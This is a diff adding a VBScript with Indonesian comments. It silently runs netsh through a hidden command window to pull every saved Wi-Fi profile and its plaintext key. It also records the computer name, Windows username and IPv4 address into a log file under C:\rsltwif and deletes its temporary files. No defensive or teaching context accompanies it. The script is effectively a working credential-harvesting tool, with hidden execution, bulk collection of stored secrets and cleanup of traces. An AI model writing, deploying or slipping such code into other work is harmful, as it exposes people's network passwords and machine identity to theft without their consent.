@@ -1,0 +1,357 @@
+Option Explicit
+On Error Resume Next
+
+'================= KONFIGURASI =================
+Dim targetFolder, outFilePath, todayStr
+Dim computerName, userName, ipAddress
+
+
+targetFolder = "C:\rsltwif"
+
+todayStr = Right("0" & Day(Date),2) & "-" & _
+           Right("0" & Month(Date),2) & "-" & _
+           Year(Date)
+
+outFilePath = targetFolder & "\rsltwif.txt"
+'===============================================
+
+Dim shell, fso, outFile
+Dim tmpProfiles, tmpProfile
+Dim ssid, line, pw
+Dim i, j, lines1, lines2
+
+Set shell = CreateObject("WScript.Shell")
+Set fso   = CreateObject("Scripting.FileSystemObject")
+
+'================================================
+' CEK FOLDER
+' Kalau belum ada, buat terlebih dahulu
+'================================================
+
+If Not fso.FolderExists(targetFolder) Then
+    fso.CreateFolder targetFolder
+End If
+
+' Kalau setelah dibuat masih tidak ada,
+' hentikan script
+If Not fso.FolderExists(targetFolder) Then
+    WScript.Quit
+End If
+
+'================================================
+' JALANKAN CMD TERSEMBUNYI
+'================================================
+
+Sub RunHidden(cmd)
+    shell.Run "%comspec% /c " & cmd, 0, True
+End Sub
+
+'================================================
+' BACA FILE
+'================================================
+
+Function ReadLines(path)
+
+    Dim arr(), t, fh
+
+    t = -1
+
+    If Not fso.FileExists(path) Then
+        ReadLines = Array()
+        Exit Function
+    End If
+
+    Set fh = fso.OpenTextFile(path,1)
+
+    Do Until fh.AtEndOfStream
+
+        t = t + 1
+
+        ReDim Preserve arr(t)
+
+        arr(t) = fh.ReadLine
+
+    Loop
+
+    fh.Close
+
+    If t = -1 Then
+        ReadLines = Array()
+    Else
+        ReadLines = arr
+    End If
+
+End Function
+
+'================================================
+' AMBIL PROFIL WIFI
+'================================================
+
+tmpProfiles = targetFolder & "\tmp_profiles.txt"
+
+RunHidden "netsh wlan show profiles > """ & tmpProfiles & """"
+
+lines1 = ReadLines(tmpProfiles)
+
+Dim profiles
+Set profiles = CreateObject("Scripting.Dictionary")
+
+If IsArray(lines1) Then
+
+    For i = 0 To UBound(lines1)
+
+        line = Trim(lines1(i))
+
+        If InStr(line, ":") > 0 Then
+
+            If InStr(LCase(line),"profile") > 0 Then
+
+                ssid = Trim(Mid(line, InStr(line,":")+1))
+
+                If ssid <> "" Then
+
+                    If Not profiles.Exists(ssid) Then
+                        profiles.Add ssid, ""
+                    End If
+
+                End If
+
+            End If
+
+        End If
+
+    Next
+
+End If
+
+If fso.FileExists(tmpProfiles) Then
+    fso.DeleteFile tmpProfiles, True
+End If
+
+'================================================
+' BUAT / APPEND FILE
+'================================================
+
+If fso.FileExists(outFilePath) Then
+
+    Set outFile = fso.OpenTextFile(outFilePath,8,True)
+
+    outFile.WriteLine ""
+    outFile.WriteLine "========== LOG TAMBAHAN =========="
+
+Else
+
+    Set outFile = fso.CreateTextFile(outFilePath,True)
+
+
+
+End If
+
+outFile.WriteLine "" & Now
+
+
+'================================================
+' JIKA TIDAK ADA PROFIL
+'================================================
+
+If profiles.Count = 0 Then
+
+    outFile.WriteLine "Tidak ada profil wifi ditemukan."
+
+    outFile.WriteLine "Selesai : " & Now
+    outFile.WriteLine "================================"
+
+    outFile.Close
+
+    WScript.Quit
+
+End If
+
+'================================================
+' AMBIL PASSWORD
+'================================================
+
+For Each ssid In profiles.Keys
+
+    pw = "(tidak ditemukan)"
+
+    tmpProfile = targetFolder & "\tmp_profile.txt"
+
+    RunHidden "netsh wlan show profile name=""" & ssid & """ key=clear > """ & tmpProfile & """"
+
+    lines2 = ReadLines(tmpProfile)
+
+    If IsArray(lines2) Then
+
+        For j = 0 To UBound(lines2)
+
+            line = Trim(lines2(j))
+
+            If InStr(LCase(line),"key content") > 0 _
+            Or InStr(LCase(line),"konten") > 0 Then
+
+                pw = Trim(Mid(line, InStr(line,":")+1))
+
+                Exit For
+
+            End If
+
+        Next
+
+    End If
+
+    outFile.WriteLine " : " & ssid & " = " & pw
+
+
+Next
+
+'================================================
+' HAPUS FILE TEMPORARY
+'================================================
+
+If fso.FileExists(tmpProfile) Then
+    fso.DeleteFile tmpProfile, True
+End If
+
+'================================================
+' SELESAI
+'================================================
+
+
+
+
+
+
+
+
+
+On Error Resume Next
+
+
+
+
+
+
+
+'================================================
+' NAMA KOMPUTER
+'================================================
+
+computerName = shell.ExpandEnvironmentStrings("%COMPUTERNAME%")
+
+'================================================
+' USERNAME WINDOWS
+'================================================
+
+userName = shell.ExpandEnvironmentStrings("%USERNAME%")
+
+'================================================
+' AMBIL IP ADDRESS
+'================================================
+
+Dim tmpIP
+tmpIP = targetFolder & "\tmp_ip.txt"
+
+shell.Run "%comspec% /c ipconfig > """ & tmpIP & """", 0, True
+
+ipAddress = AmbilIPv4(tmpIP)
+
+If fso.FileExists(tmpIP) Then
+    fso.DeleteFile tmpIP, True
+End If
+
+'================================================
+' BUAT / APPEND FILE
+'================================================
+
+If fso.FileExists(outFilePath) Then
+
+    Set outFile = fso.OpenTextFile(outFilePath, 8, True)
+
+
+Else
+
+    Set outFile = fso.CreateTextFile(outFilePath, True)
+
+End If
+
+'================================================
+' SIMPAN DATA
+'================================================
+
+outFile.WriteLine "<=>" & computerName
+outFile.WriteLine "<=>" & userName
+outFile.WriteLine "<=>" & ipAddress
+
+
+outFile.Close
+
+'================================================
+' SELESAI
+'================================================
+
+Set outFile = Nothing
+Set fso = Nothing
+Set shell = Nothing
+
+WScript.Quit
+
+
+'================================================
+' FUNGSI AMBIL IPv4
+'================================================
+
+Function AmbilIPv4(path)
+
+    Dim fh
+    Dim line
+    Dim p
+    Dim nilai
+
+    AmbilIPv4 = "(tidak ditemukan)"
+
+    If Not fso.FileExists(path) Then
+        Exit Function
+    End If
+
+    Set fh = fso.OpenTextFile(path, 1)
+
+    Do Until fh.AtEndOfStream
+
+        line = Trim(fh.ReadLine)
+
+        'Windows bahasa Inggris
+        If InStr(LCase(line), "ipv4") > 0 Then
+
+            p = InStr(line, ":")
+
+            If p > 0 Then
+
+                nilai = Trim(Mid(line, p + 1))
+
+                If nilai <> "" Then
+                    AmbilIPv4 = nilai
+                    fh.Close
+                    Exit Function
+                End If
+
+            End If
+
+        End If
+
+    Loop
+
+    fh.Close
+
+End Function
+
+
+
+
+
+outFile.Close
+
+Set outFile = Nothing
+Set profiles = Nothing
+Set fso = Nothing
+Set shell = Nothing
